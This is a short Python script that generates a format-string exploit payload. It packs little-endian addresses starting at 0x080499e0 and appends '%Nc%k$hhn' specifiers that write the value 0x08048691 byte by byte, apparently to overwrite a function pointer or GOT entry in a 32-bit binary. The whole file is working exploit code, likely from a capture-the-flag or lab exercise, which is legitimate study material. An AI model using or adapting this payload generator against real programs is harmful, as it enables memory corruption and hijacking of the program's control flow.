#!/usr/bin/env python3
start_address = 0x080499e0
values = '08048691'
number = 6

values = [values[i:i+2] for i in range(0, len(values), 2)]
values.reverse() # little endian
output = ''
byte_counter = 0

for i in range(len(values)):
    addr = f'{start_address+i:08x}'
    addrs = [addr[j:j+2] for j in range(0, len(addr), 2)]
    addrs.reverse()
    byte_counter += len(addrs)
    output += ''.join([f'\\x{a}' for a in addrs])

p_value = byte_counter
for i in range(len(values)):
    value = int(values[i], 16)
    number_of_char = value - p_value
    if number_of_char < 0: number_of_char += 256
    output += f'%{number_of_char}c%{number}$hhn'
    number += 1
    p_value = value
print(output)
